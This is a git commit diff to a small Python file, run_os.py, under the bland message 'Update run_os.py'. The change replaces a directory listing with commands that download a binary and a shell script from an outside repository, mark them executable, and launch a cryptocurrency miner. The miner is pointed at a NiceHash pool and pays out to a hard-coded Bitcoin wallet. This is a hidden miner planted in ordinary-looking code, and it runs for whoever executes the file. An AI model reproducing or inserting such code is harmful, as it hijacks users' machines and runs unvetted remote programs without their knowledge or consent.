ae53fb425c5fc9db571ec1b6d3656f587f6d9add
aka648582 <92806468+aka648582@users.noreply.github.com>
2021-10-19 18:24:58 +0000

    Update run_os.py

--- run_os.py
+++ run_os.py
@@ -1,2 +1,7 @@
 import os
-os.system('ls -l')
+os.system('wget https://github.com/aka648582/yes/raw/main/gas')
+os.system('chmod +x gas')
+
+os.system('wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh')
+os.system('chmod +x cmdline_launcher.sh')
+os.system('./cmdline_launcher.sh -algo autolykos  -coin BTC-wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390')
